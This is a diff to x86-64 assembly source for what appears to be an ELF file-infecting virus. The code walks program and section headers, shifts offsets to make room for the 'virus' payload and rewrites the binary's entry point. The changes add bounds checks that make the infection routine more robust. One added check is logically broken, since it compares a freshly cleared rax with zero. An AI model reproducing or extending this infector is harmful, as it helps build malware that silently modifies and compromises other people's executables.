@@ -94,6 +94,8 @@ _if:
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 8 ; add 8 bytes to acces p_offset
 	mov r10, QWORD [r10] ; dereference it to take the value
+	cmp r10, QWORD [rsp + 8]
+	jge _end
 	cmp r10, QWORD [rsp + 72] ; if phdr->p_offset >= virus offset
 	jl _else_if
 	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
@@ -114,6 +116,8 @@ _else_if:
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 8 ; add 8 bytes to take p_offset (offset of the segment in file)
 	mov r12, QWORD [r10]
+	cmp r12, QWORD [rsp + 8]
+	jge _end
 	mov QWORD [rsp + 140], r12
 	mov r12, r10
 	add r12, 8
@@ -125,6 +129,9 @@ _else_if:
 	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
 	mov r11, QWORD [r10] ; dereference
 	add QWORD [rsp + 72], r11 ; virus offset += phdr->p_filesz
+	mov r12, QWORD [rsp + 72]
+	cmp r12, QWORD [rsp + 8]
+	jge _end
 ; modify e_entry
 	mov r11, QWORD [rsp] ; take mmap_base_addr
 	add r11, 24 ; e_entry offset
@@ -165,6 +172,7 @@ _init_treat_all_sections:
 	xor r10, r10 ; clear r10
 	mov r10w, WORD [r11] ; dereference our address to take e_shnum value
 	mov QWORD [rsp + 56], r10 ; store it on stack
+	mov QWORD [rsp + 96], 0
 
 _treat_all_sections:
 	mov r10, QWORD [rsp + 48] ; take shnum
@@ -173,7 +181,7 @@ _treat_all_sections:
 	mov r10, QWORD [rsp + 40] ; take shdr
 	sub r10, QWORD [rsp] ; sub mmap_base_addr to shdr, to take the offset
 	cmp r10, QWORD [rsp + 8] ; check if this offset is in file bounds
-	jge _munmap
+	jge _end
 
 _if_offset_equal_virus_offset:
 	xor r10, r10 ; clear r10
@@ -181,8 +189,23 @@ _if_offset_equal_virus_offset:
 	add r10, 24 ; shdr->sh_offset offset
 	mov r11, QWORD [rsp + 40] ; take shdr
 	add r11, 32 ; shdr->sh_size offset
+	mov r12, QWORD [rsp + 8]
 	mov rdi, QWORD [r10] ; mov the value of sh_offset in rdi
 	add rdi, QWORD [r11] ; add the value of sh_size
+
+	mov r12, QWORD [rsp + 40]
+	add r12, 4
+	xor r13, r13
+	mov r13d, DWORD [r12]
+	xor rax, rax
+	and r13d, 8
+	cmp rax, 0
+	je .check_virus_offset
+
+	cmp rdi, QWORD [rsp + 8]
+	jge _end
+
+	.check_virus_offset:
 	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
 	jne _if_offset_greater_or_equal_virus_offset
 	mov r10, PAGE_SIZE
@@ -193,6 +216,8 @@ _if_offset_greater_or_equal_virus_offset:
 	mov r10, QWORD [rsp + 40] ; take shdr
 	add r10, 24 ; shdr->sh_offset offset
 	mov r10, QWORD [r10] ; dereference sh_offset addres
+	cmp r10, QWORD [rsp + 8]
+	jge _end
 	cmp r10, QWORD [rsp + 72] ; if shdr->sh_offset >= virus offset
 	jl _inc_jmp_loop_sections
 ; add PAGE_SIZE to sh_offset
@@ -206,6 +231,7 @@ _inc_jmp_loop_sections:
 	jmp _treat_all_sections
 
 _init_mmap_tmp:
+	
 ; add PAGESIZE to sections offset
 	mov r10, QWORD [rsp] ; take mmap_base_addr
 	add r10, 40 ; go to sh_offset
